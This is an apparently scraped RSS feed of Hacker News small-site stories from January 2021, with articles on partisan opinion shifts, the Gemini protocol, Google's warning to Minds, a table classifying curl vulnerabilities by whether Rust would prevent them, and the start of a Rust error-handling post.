<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 20]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 20. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Tue, 19 Jan 2021 02:00:38 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-20.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Tue, 19 Jan 2021 02:00:38 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[When parties reverse their stance, supporters immediately switch their opinions]]>
            </title>
            <description>
<![CDATA[
Score 159 | Comments 163 (<a href="https://news.ycombinator.com/item?id=25807656">thread link</a>) | @nabla9
<br/>
January 16, 2021 | https://thespeakernewsjournal.com/science/when-political-parties-reverse-their-policy-stance-their-supporters-immediately-switch-their-opinions-too/ | <a href="https://web.archive.org/web/*/https://thespeakernewsjournal.com/science/when-political-parties-reverse-their-policy-stance-their-supporters-immediately-switch-their-opinions-too/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page">
				<div id="content">
			
	<div id="primary">
		<main id="main">
			
<article id="post-15093" itemtype="https://schema.org/CreativeWork" itemscope="">
	<div>
				
					
			
		<div itemprop="text">
			<p>At least a significant portion of their supporters, according to U of Aarhus researchers.</p>
<p>When two competing political parties in Denmark reversed their policy stance on an issue — suddenly they both supported reducing unemployment benefits — their voters immediately moved their opinions by around 15% into line with their party.</p>
<p>The same thing happened when one of these parties shifted from opposing to supporting ending Denmark’s early retirement.</p>
<p>The researchers were studying how public opinion is formed. Their recent paper sheds light on how much influence political parties have over their supporters, according to the researchers, who surveyed their panel of subjects in five successive waves between 2010 and 2011. They studied the same group of party supporters before, during and after a policy reversal.</p>
<p>“We can see that [the] welfare programs were actually quite popular … and many of the voters of the center-right party were in favor of these welfare programs,” commented one of the researchers, Rune Slothuus. “Nevertheless, we can see that they reversed their opinion from supporting these welfare programs to opposing these welfare programs.”</p>
<p dir="ltr">“I was surprised to see the parties appeared this powerful in shaping opinions,” Slothuus said. “Our findings suggest that partisan leaders can indeed lead citizens’ opinions in the real world, even in situations where the stakes are real and the economic consequences tangible.”</p>
<p dir="ltr">The researchers pondered Western democracy in light of their findings: “If citizens just blindly follow their party without thinking much about it, that should lead to some concern about the mechanisms in our democracy. Because how can partisan elites represent citizens’ views if the views of citizens are shaped by the very same elites who are supposed to represent them?”</p>
<h6 dir="ltr">Source: How Political Parties Shape Public Opinion in the Real World.  and <a id="a2_Ctrl" role="button" href="https://onlinelibrary.wiley.com/action/doSearch?ContribAuthorStored=Bisgaard%2C+Martin" data-id="a2" data-db-target-for="a2" aria-controls="a2" aria-haspopup="true">Martin Bisgaard. </a><span>First published: </span><span>04 November 2020</span> <a href="https://doi.org/10.1111/ajps.12550" aria-label="Digital Object Identifier">https://doi.org/10.1111/ajps.12550</a></h6>

						


<div>
    <h3>The brain listens for things it is trying to predict</h3>
    <div><p>The brain interprets sounds as they contrast with its expectations; it recognizes patterns of sounds faster when they’re in line with what it is predicting it will hear, but it only encodes sounds when they contrast with expectations, according to <span>Technische U researchers. </span></p>
<p>The researchers showed this by monitoring the two principal nuclei of the subcortical pathway responsible for auditory processing: the inferior colliculus and the medial geniculate body, as their subjects listened to patterns of sounds which the researches modified so that sometimes they would hear an expected sound pattern, and other times something unexpected.</p>
<h6>Source: Alejandro Tabas, Glad Mihai, Stefan Kiebel, Robert Trampel, Katharina von Kriegstein. <strong>Abstract rules drive adaptation in the subcortical sensory pathway</strong>. <em>eLife</em>, 2020; 9 DOI: <a href="http://dx.doi.org/10.7554/eLife.64501" target="_blank" rel="nofollow noopener">10.7554/eLife.64501</a></h6>
</div>
</div>
						


<div>
    <h3>We have a particular way of understanding a room</h3>
    <div><p>When several research subjects were instructed to explore an empty room, and when they were instead seated in a chair and watched someone else explore the room, their brain waves followed a certain pattern, as recorded by a backpack hooked up to record their brain waves, eye movements, and paths. It didn’t matter if they were walking or watching someone else, according to UC researchers led by Dr Matthias Stangl.</p>
<p>The researchers also tested what happened when subjects searched for a hidden spot, or watched someone else do so, and found that brain waves flowed more strongly when they had a goal and hunted for something.</p>
<h6>Source: Matthias Stangl, Uros Topalovic, Cory S. Inman, Sonja Hiller, Diane Villaroman, Zahra M. Aghajan, Leonardo Christov-Moore, Nicholas R. Hasulak, Vikram R. Rao, Casey H. Halpern, Dawn Eliashiv, Itzhak Fried, Nanthia Suthana. <strong>Boundary-anchored neural mechanisms of location-encoding for self and others</strong>. <em>Nature</em>, 2020; DOI: <a href="http://dx.doi.org/10.1038/s41586-020-03073-y" target="_blank" rel="nofollow noopener">10.1038/s41586-020-03073-y</a></h6>
</div>
</div>
						


<div>
    <h3>Extroverts and introverts use different vocabularies</h3>
    <div><p>Extroverts use ‘positive emotion’ and ‘social process’ words more often than introverts, according to new research conducted at <span>Nanyang Technological U</span>.</p>
<p>‘Love,’ ‘happy,’ and ‘blessed’ indicate pleasant emotions, and ‘beautiful’ and ‘nice’ indicate positivity or optimism, and are among the words found to be used more often by extroverts. So too are ‘meet,’ ‘share,’ and ‘talk,’ which are about socializing. Extroverts use personal pronouns — except ‘I’ — more too, another indication of sociability.</p>
<p>The correlation, however, was small, and the researchers think that stronger linguistic indicators need to be found to achieve their general goal, which is improving machine learning approaches to targeting consumer marketing.</p>
<h6>Source: Jiayu Chen, Lin Qiu, Moon-Ho Ringo Ho. <strong>A meta-analysis of linguistic markers of extraversion: Positive emotion and social process words</strong>. <em>Journal of Research in Personality</em>, 2020; 89: 104035 DOI: <a href="http://dx.doi.org/10.1016/j.jrp.2020.104035" target="_blank" rel="nofollow noopener">10.1016/j.jrp.2020.104035</a></h6>
</div>
</div>
						


<div>
    <h3>WhatsApp is changing today - Users must give the app permission to send their private data to Facebook or lose account</h3>
    <div><p>WhatsApp was bought by Facebook in 2014, but has thrived while promoting itself as a privacy-respecting messaging app that now has 1.5b monthly active users. This week, though, WhatApp sent out an update to users’ phones that they must ‘consent’ to a new policy or lose access.</p>
<p>Whatsapp will now share more of your data, including your IP address (your location) and phone number, your account registration information, your transaction data, and service-related data, interactions on WhatsApp, and other data collected based on your consent, with Facebook’s other companies. Facebook has been working towards more closely integrating Facebook, WhatsApp, Instagram and Messenger.</p>
<p>Users who do not agree to ‘consent’ to the new policy will see their WhatsApp account become inaccessible until they do ‘consent.’ These accounts will remain dormant for 120 days after which they will be ‘deleted.’</p>
<p>The biggest change to the user policy, which many people ignored and clicked ‘agree’ to, thinking it was just another unimportant app update message, now reads,</p>
<blockquote><p><em>‘We collect information about your activity on our Services, like service-related, diagnostic, and performance information. This includes information about your activity (including how you use our Services, your Services settings, how you interact with others using our Services (including when you interact with a business), and the time, frequency, and duration of your activities and interactions), log files, and diagnostic, crash, website, and performance logs and reports. This also includes information about when you registered to use our Services; the features you use like our messaging, calling, Status, groups (including group name, group picture, group description), payments or business features; profile photo, “about” information; whether you are online, when you last used our Services (your “last seen”); and when you last updated your “about” information.’</em></p></blockquote>
<p>Notably, Elon Musk tweeted on the news, saying that WhatsApp users should switch to Signal, one of several popular privacy-focused messaging apps similar to WhatsApp.</p>
<p>The data sharing policy change doesn’t affect people in Europe due to GDPR data protection regulations.</p>
</div>
</div>
						


<div>
    <h3>President Trump silenced on top social media platforms after mob storms Capitol</h3>
    <div><p>The US president was locked out from posting new messages on his Facebook and Twitter accounts after an unruly group of supporters assembled outside the capitol building where Biden’s election win was being confirmed.</p>
<p>The lockdown on Twitter lasted 12 hours until the president removed tweets Twitter said violated its ‘civic integrity policy,’ but Zuckerburg said that Trump would be silenced on Facebook and Instagram for at least two more weeks until his presidential term was over. Facebook and Twitter are two of the main ways the president communicates with citizens and the world.</p>
<p>It is the first time social media platforms have chosen to limit the free speech of such an important figure.</p>
<h6><em>Trump’s tweets from Jan 6, 2020, as recorded by thetrumparchive.com</em></h6>


<p>Many news organizations covered the story using language such as <a href="https://thespeakernewsjournal.com/wp-content/uploads/2021/01/Trump-Incites-Rioters.png" target="_blank" rel="noopener" data-slb-active="1" data-slb-asset="942503913" data-slb-internal="0" data-slb-group="15093_15041">‘Trump Incites Rioters.’</a></p>
<p>Following Trumps ‘ban,’ there was renewed talk about treating social media platforms, where people share informative content, as publishers themselves, in part because their algorithms amplify things shared when those things are engaging. There was also talk about how the social media platforms that censored the president’s content did so as a response to content or events but without first drawing their ‘red line’ and saying which content is and isn’t allowed on their platforms.</p>
<p>Some of Trump’s staff resigned following the incident at the Capitol building, and there were also a lot of questions why the national guard wasn’t capable of handling the incident properly.</p>
<p>UPDATE January 8: Twitter permanently banned Trump’s account. Google removed Parler, an app like Twitter used by Trump supporters, from the Android app store to make it harder for people to download it, saying Google requires social media apps to have content moderation policies to remove posts that incite violence.</p>
</div>
</div>		</div>

				
			</div>
</article>

			

					</main>
	</div>

	

	</div>
</div></div>]]>
            </description>
            <link>https://thespeakernewsjournal.com/science/when-political-parties-reverse-their-policy-stance-their-supporters-immediately-switch-their-opinions-too/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25807656</guid>
            <pubDate>Sun, 17 Jan 2021 02:56:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Tragedy of Gemini]]>
            </title>
            <description>
<![CDATA[
Score 46 | Comments 20 (<a href="https://news.ycombinator.com/item?id=25807633">thread link</a>) | @panic
<br/>
January 16, 2021 | https://maya.land/monologues/2021/01/11/the-tragedy-of-gemini.html | <a href="https://web.archive.org/web/*/https://maya.land/monologues/2021/01/11/the-tragedy-of-gemini.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article itemscope="" itemtype="http://schema.org/BlogPosting">
  

  <div itemprop="articleBody">
    <p><strong>the below does not explain what Gemini is, but <a href="https://gemini.circumlunar.space/">this does</a></strong></p>

<p>Reading people’s gemlogs, I get a sense of a smaller internet. I stumble across an article about Pacific Northwest seaweed, a list of types. Someone else writes her thoughts: “Really, prepare to question groupthink”. A history of adoptable cyberpets. It is addicting to read people’s neat summaries of interests, ascii art embellishments.</p>

<p>But something about it makes me sad.</p>

<p>There’s something called the Eternal September, about how – well, should I be pretending to tell you from the position of someone who’d know? It happened the month after I was born.</p>

<p>Every September before, college students with new network access would stream onto Usenet fora without ever having accustomed themselves to the etiquette. Things would get rowdy and stupid for a while. Then they would learn or get bored and things would quiet down again.</p>

<p>That September, though, was more than just college students – America Online offered Usenet access to all its members. Ever after, the numbers would be dominated by those who had no manners, who didn’t know there was culture to learn. September continued forever.</p>

<p>The design of Gemini isn’t the community. I’m sure there are a few people who use the bridged NPR website available served via Gemini who are really in it because they’re Just That Mad About JavaScript, but those aren’t the people who make the place. It’s a bunch of people who learned a new markup language and installed some new fiddly tools and wrote their journals in plain text and taught me what seaweed is edible… why?</p>

<p>Something about Gemini strikes me as a grail quest for the Eternal August, before webscale crushed the things we love.</p>

<p>While everything I have seen served via Gemini is friendly and sociable, the technical barriers of what-is-a-command-line and how-do-I-use-one are a fence put up that keep out the riffraff. Certainly, you can walk around the corner and go through the gate, but ultimately the geminiverse is lovely because it is underpopulated, slower-paced, and literate. It is difficult enough to access that those who can use it can be welcoming without worrying its smallness will be compromised.</p>

<p>The tragedy is that I don’t think many of its denizens would claim that they <em>only</em> want to hear from technical, educated people, but in order to use a <em>small</em> internet, an August internet, they have let the fence keep out anyone else.</p>

<p>This is the part of the piece where I pivot to My Proposal to Fix Everything, right? Where I tell you about my new community or my idea for what people should be doing or if we only started using tags <em>right</em>…</p>

<p>I don’t know that I think that it’s that neat.</p>

<p>I will probably keep reading things on Gemini, keep querying its search engine for terms and being delighted by neatly crafted plain-text.</p>

<p>But I will probably keep finding it sad.</p>

  </div>
</article></div>]]>
            </description>
            <link>https://maya.land/monologues/2021/01/11/the-tragedy-of-gemini.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25807633</guid>
            <pubDate>Sun, 17 Jan 2021 02:52:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Google sends ‘24 hour warning’ to free-speech ‘anti-Facebook’ platform, Minds]]>
            </title>
            <description>
<![CDATA[
Score 35 | Comments 26 (<a href="https://news.ycombinator.com/item?id=25806746">thread link</a>) | @drummer
<br/>
January 16, 2021 | https://speakingaboutnews.com/google-sends-24-hour-warning-to-free-speech-anti-facebook-platform-minds/ | <a href="https://web.archive.org/web/*/https://speakingaboutnews.com/google-sends-24-hour-warning-to-free-speech-anti-facebook-platform-minds/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text">
			<p><strong>The social media platform Minds had to remove ‘major functionality’ from its Android app after getting a chilling warning from Google. Its co-founder said plans for a censorship-resistant infrastructure are in the works.</strong></p>
<p>In a&nbsp;<a href="https://www.minds.com/newsfeed/1196949029506060288" rel="noreferrer noopener" target="_blank">post</a>&nbsp;on Friday evening, Bill Ottman said that Minds had received a&nbsp;<em>“24 hour warning”</em>&nbsp;from the Google Play store. This forced them to submit an updated version of the app, based on&nbsp;<em>“interim solution and ninja developers,”</em> which removed the search, discovery and comments functionality.</p>
<p><em>“I know. We aren’t happy and will be working towards something better,”</em>&nbsp;Ottman said.&nbsp;<em>“What is happening on the internet with major providers is fueling the cultural divide as much as anything,”</em>&nbsp;he added.</p>
<p>Operating since 2015, Minds was conceived as a blockchain-based community-owned social media platform that would not monetize user data but enable free speech instead.&nbsp;<a href="https://www.wired.com/story/minds-anti-facebook/" rel="noreferrer noopener" target="_blank">Wired</a>&nbsp;magazine once described it as the&nbsp;<em>“anti-Facebook.”</em></p>
<p><em>Owen is joined by James O’Keefe of Project Veritas, after the explosive video released of Twitter CEO Jack Dorsey who revealed his true intentions on social media.</em></p>
<p>Ottman advised users to download the app from Minds directly if possible.&nbsp;<em>“If you are on Apple, leave if you’re smart,”</em>&nbsp;he said.</p>


<p>As for going forward, he said a plan for&nbsp;<em>“fully censorship-resistant infrastructure”</em>&nbsp;is coming soon, and that Minds has&nbsp;<em>“multiple escape pods ready to go”</em>&nbsp;if Amazon moves against them.</p>
<p>Ottman’s comments were a clear reference to what happened to Parler. The free-speech social media platform attracted tens of thousands of users purged from Twitter in the wake of the January 6 unrest at the US Capitol – only to be banned from Google and Apple stores, and then taken down from the internet entirely after Amazon Web Services (AWS) denied them access to the cloud. Parler’s executives later revealed that other vendors rushed to jump ship as well, leaving them unable to operate entirely.</p>
<p>Those who complained about the rising tide of censorship have typically been told that the First Amendment to the US Constitution did not apply to private companies and that people should&nbsp;<em>“build their own”</em>&nbsp;platforms if they disagreed. Parler’s shutdown has shown that this is near-impossible when the major players control the internet infrastructure itself, however.</p>
<p>Mainstream media and tech platforms have gone after Parler, Gab, Minds, and Telegram for allegedly having&nbsp;<em>“far-right”</em>users and allowing&nbsp;<em>“hate speech”</em>&nbsp;as content. In Parler’s case, Amazon’s ultimatum demanded moderation policies they would approve of in order to avoid removal from AWS.</p>
<p>In a lawsuit accusing Amazon of breach of contract, antitrust violations and defamation, Parler argued that this was pretextual and revealed that Amazon staff sought to find out if US President Donald Trump – freshly banned from Twitter and locked out of Facebook – had set up an account on the platform.</p>
    
    		</div></div>]]>
            </description>
            <link>https://speakingaboutnews.com/google-sends-24-hour-warning-to-free-speech-anti-facebook-platform-minds/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25806746</guid>
            <pubDate>Sun, 17 Jan 2021 00:03:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Would Rust Secure Curl?]]>
            </title>
            <description>
<![CDATA[
Score 124 | Comments 110 (<a href="https://news.ycombinator.com/item?id=25805576">thread link</a>) | @todsacerdoti
<br/>
January 16, 2021 | https://timmmm.github.io/curl-vulnerabilities-rust/ | <a href="https://web.archive.org/web/*/https://timmmm.github.io/curl-vulnerabilities-rust/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <tr>
        <td>95</td>
        <td>wrong connect-only connection</td>
        <td>Logic, pointers</td>
        <td>2</td>
      </tr>
      <tr>
        <td>94</td>
        <td>curl overwrite local file with -J</td>
        <td>Logic</td>
        <td>1</td>
      </tr>
      <tr>
        <td>93</td>
        <td>Partial password leak over DNS on HTTP redirect</td>
        <td>Logic, quoting</td>
        <td>1</td>
      </tr>
      <tr>
        <td>92</td>
        <td>FTP-KRB double-free</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>91</td>
        <td>TFTP small blocksize heap buffer overflow</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>90</td>
        <td>Windows OpenSSL engine code injection</td>
        <td>Logic</td>
        <td>0</td>
      </tr>
      <tr>
        <td>89</td>
        <td>TFTP receive buffer overflow</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>88</td>
        <td>Integer overflows in curl_url_set</td>
        <td>Integer overflow leading to memory</td>
        <td>3</td>
      </tr>
      <tr>
        <td>87</td>
        <td>NTLM type-2 out-of-bounds buffer read</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>86</td>
        <td>NTLMv2 type-3 header stack buffer overflow</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>85</td>
        <td>SMTP end-of-response out-of-bounds read</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>84</td>
        <td>warning message out-of-buffer read</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>83</td>
        <td>use-after-free in handle close</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>82</td>
        <td>SASL password overflow via integer overflow</td>
        <td>Integer overflow leading to memory</td>
        <td>3</td>
      </tr>
      <tr>
        <td>81</td>
        <td>NTLM password overflow via integer overflow</td>
        <td>Integer overflow leading to memory</td>
        <td>3</td>
      </tr>
      <tr>
        <td>80</td>
        <td>SMTP send heap buffer overflow</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>79</td>
        <td>FTP shutdown response buffer overflow</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>78</td>
        <td>RTSP bad headers buffer over-read</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>77</td>
        <td>RTSP RTP buffer over-read</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>76</td>
        <td>LDAP NULL pointer dereference</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>75</td>
        <td>FTP path trickery leads to NIL byte out of bounds write</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>74</td>
        <td>HTTP authentication leak in redirects</td>
        <td>Logic</td>
        <td>0</td>
      </tr>
      <tr>
        <td>73</td>
        <td>HTTP/2 trailer out-of-bounds read</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>72</td>
        <td>SSL out of buffer access</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>71</td>
        <td>FTP wildcard out of bounds read</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>70</td>
        <td>NTLM buffer overflow via integer overflow</td>
        <td>Integer overflow leading to memory</td>
        <td>3</td>
      </tr>
      <tr>
        <td>69</td>
        <td>IMAP FETCH response out of bounds read</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>68</td>
        <td>FTP PWD response parser out of bounds read</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>67</td>
        <td>URL globbing out of bounds read</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>66</td>
        <td>TFTP sends more than buffer size</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>65</td>
        <td>FILE buffer read out of bounds</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>64</td>
        <td>URL file scheme drive letter buffer overflow</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>63</td>
        <td>TLS session resumption client cert bypass (again)</td>
        <td>Logic, reuse</td>
        <td>0</td>
      </tr>
      <tr>
        <td>62</td>
        <td>--write-out out of buffer read</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>61</td>
        <td>SSL_VERIFYSTATUS ignored</td>
        <td>Logic</td>
        <td>0</td>
      </tr>
      <tr>
        <td>60</td>
        <td>uninitialized random</td>
        <td>Type error</td>
        <td>4</td>
      </tr>
      <tr>
        <td>59</td>
        <td>printf floating point buffer overflow</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>58</td>
        <td>Win CE schannel cert wildcard matches too much</td>
        <td>Logic</td>
        <td>0</td>
      </tr>
      <tr>
        <td>57</td>
        <td>Win CE schannel cert name out of buffer read</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>56</td>
        <td>cookie injection for other servers</td>
        <td>Logic, difficult to use API</td>
        <td>3</td>
      </tr>
      <tr>
        <td>55</td>
        <td>case insensitive password comparison</td>
        <td>Logic, terrible function name</td>
        <td>0</td>
      </tr>
      <tr>
        <td>54</td>
        <td>OOB write via unchecked multiplication</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>53</td>
        <td>double-free in curl_maprintf</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>52</td>
        <td>double-free in krb5 code</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>51</td>
        <td>glob parser write/read out of bounds</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>50</td>
        <td>curl_getdate read out of bounds</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>49</td>
        <td>URL unescape heap overflow via integer truncation</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>48</td>
        <td>Use-after-free via shared cookies</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>47</td>
        <td>invalid URL parsing with '#'</td>
        <td>Logic, used regex, now 2 problems</td>
        <td>0</td>
      </tr>
      <tr>
        <td>46</td>
        <td>IDNA 2003 makes curl use wrong host</td>
        <td>Logic, unicode insanity</td>
        <td>1</td>
      </tr>
      <tr>
        <td>45</td>
        <td>curl escape and unescape integer overflows</td>
        <td>Integer overflow leading to memory</td>
        <td>3</td>
      </tr>
      <tr>
        <td>44</td>
        <td>Incorrect reuse of client certificates</td>
        <td>Logic, reuse</td>
        <td>0</td>
      </tr>
      <tr>
        <td>43</td>
        <td>TLS session resumption client cert bypass</td>
        <td>Logic, reuse</td>
        <td>0</td>
      </tr>
      <tr>
        <td>42</td>
        <td>Re-using connections with wrong client cert</td>
        <td>Logic, reuse</td>
        <td>0</td>
      </tr>
      <tr>
        <td>41</td>
        <td>use of connection struct after free</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>40</td>
        <td>Windows DLL hijacking</td>
        <td>Windows API nonsense</td>
        <td>0</td>
      </tr>
      <tr>
        <td>39</td>
        <td>TLS certificate check bypass with mbedTLS/PolarSSL</td>
        <td>Logic</td>
        <td>0</td>
      </tr>
      <tr>
        <td>38</td>
        <td>remote file name path traversal in curl tool for Windows</td>
        <td>Logic, quoting</td>
        <td>0</td>
      </tr>
      <tr>
        <td>37</td>
        <td>NTLM credentials not-checked for proxy connection re-use</td>
        <td>Logic, reuse</td>
        <td>0</td>
      </tr>
      <tr>
        <td>36</td>
        <td>SMB send off unrelated memory contents</td>
        <td>Memory, but I think this is still reading from valid allocated memory, heartbleed style</td>
        <td>0</td>
      </tr>
      <tr>
        <td>35</td>
        <td>lingering HTTP credentials in connection re-use</td>
        <td>Logic, reuse</td>
        <td>0</td>
      </tr>
      <tr>
        <td>34</td>
        <td>sensitive HTTP server headers also sent to proxies</td>
        <td>Logic</td>
        <td>0</td>
      </tr>
      <tr>
        <td>33</td>
        <td>host name out of boundary memory access</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>32</td>
        <td>cookie parser out of boundary memory access</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>31</td>
        <td>Negotiate not treated as connection-oriented</td>
        <td>Logic</td>
        <td>0</td>
      </tr>
      <tr>
        <td>30</td>
        <td>Re-using authenticated connection when unauthenticated</td>
        <td>Logic, reuse</td>
        <td>0</td>
      </tr>
      <tr>
        <td>29</td>
        <td>darwinssl certificate check bypass</td>
        <td>Logic, reuse</td>
        <td>0</td>
      </tr>
      <tr>
        <td>28</td>
        <td>URL request injection</td>
        <td>Logic</td>
        <td>0</td>
      </tr>
      <tr>
        <td>27</td>
        <td>duphandle read out of bounds</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>26</td>
        <td>cookie leak for TLDs</td>
        <td>Logic, parsing</td>
        <td>0</td>
      </tr>
      <tr>
        <td>25</td>
        <td>cookie leak with IP address as domain</td>
        <td>Logic</td>
        <td>0</td>
      </tr>
      <tr>
        <td>24</td>
        <td>not verifying certs for TLS to IP address / Winssl</td>
        <td>Logic</td>
        <td>0</td>
      </tr>
      <tr>
        <td>23</td>
        <td>not verifying certs for TLS to IP address / Darwinssl</td>
        <td>Logic</td>
        <td>0</td>
      </tr>
      <tr>
        <td>22</td>
        <td>IP address wildcard certificate validation</td>
        <td>Logic</td>
        <td>0</td>
      </tr>
      <tr>
        <td>21</td>
        <td>wrong re-use of connections</td>
        <td>Logic</td>
        <td>0</td>
      </tr>
      <tr>
        <td>20</td>
        <td>re-use of wrong HTTP NTLM connection</td>
        <td>Logic, reuse</td>
        <td>2</td>
      </tr>
      <tr>
        <td>19</td>
        <td>cert name check ignore GnuTLS</td>
        <td>Logic</td>
        <td>0</td>
      </tr>
      <tr>
        <td>18</td>
        <td>cert name check ignore OpenSSL</td>
        <td>Logic</td>
        <td>0</td>
      </tr>
      <tr>
        <td>17</td>
        <td>URL decode buffer boundary flaw</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>16</td>
        <td>cookie domain tailmatch</td>
        <td>Logic</td>
        <td>0</td>
      </tr>
      <tr>
        <td>15</td>
        <td>SASL buffer overflow</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>14</td>
        <td>SSL CBC IV vulnerability</td>
        <td>Logic</td>
        <td>0</td>
      </tr>
      <tr>
        <td>13</td>
        <td>URL sanitization vulnerability</td>
        <td>Logic, parsing</td>
        <td>0</td>
      </tr>
      <tr>
        <td>12</td>
        <td>inappropriate GSSAPI delegation</td>
        <td>Logic</td>
        <td>0</td>
      </tr>
      <tr>
        <td>11</td>
        <td>local file overwrite</td>
        <td>Logic, parsing</td>
        <td>0</td>
      </tr>
      <tr>
        <td>10</td>
        <td>data callback excessive length</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>9</td>
        <td>embedded zero in cert name</td>
        <td>Logic, null-terminated strings</td>
        <td>4</td>
      </tr>
      <tr>
        <td>8</td>
        <td>Arbitrary File Access</td>
        <td>Logic</td>
        <td>0</td>
      </tr>
      <tr>
        <td>7</td>
        <td>GnuTLS insufficient cert verification</td>
        <td>Logic</td>
        <td>0</td>
      </tr>
      <tr>
        <td>6</td>
        <td>TFTP Packet Buffer Overflow</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>5</td>
        <td>URL Buffer Overflow</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>4</td>
        <td>NTLM Buffer Overflow</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>3</td>
        <td>Authentication Buffer Overflows</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
      <tr>
        <td>2</td>
        <td>Proxy Authentication Header Information Leakage</td>
        <td>Logic</td>
        <td>0</td>
      </tr>
      <tr>
        <td>1</td>
        <td>FTP Server Response Buffer Overflow</td>
        <td>Memory</td>
        <td>4</td>
      </tr>
    </div></div>]]>
            </description>
            <link>https://timmmm.github.io/curl-vulnerabilities-rust/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25805576</guid>
            <pubDate>Sat, 16 Jan 2021 21:15:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Rust: Structuring and handling errors in 2020 (2020)]]>
            </title>
            <description>
<![CDATA[
Score 131 | Comments 14 (<a href="https://news.ycombinator.com/item?id=25805340">thread link</a>) | @arm
<br/>
January 16, 2021 | https://nick.groenen.me/posts/rust-error-handling/ | <a href="https://web.archive.org/web/*/https://nick.groenen.me/posts/rust-error-handling/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <p>I recently started learning the <a href="https://www.rust-lang.org/">Rust programming language</a> by going through <em>"<a href="https://doc.rust-lang.org/book/">the book</a>"</em>, which does a phenomenal job of explaining the language basics.</p>
<p>After working through the book’s main content I got started with my first non-trivial, real-world application.
But I soon found myself faced with a question I didn’t yet feel well-equipped to handle:</p>
<blockquote>
<p><em>“How should you structure error handling in a mature rust application?"</em></p>
</blockquote>
<p>This article describes my journey of discovering the answer to this question.
I will try to explain the pattern I’ve settled on together with example code showing its implementation, in the hope that other newcomers may have an easier time getting started.</p>
<h2 id="contents">Contents</h2>

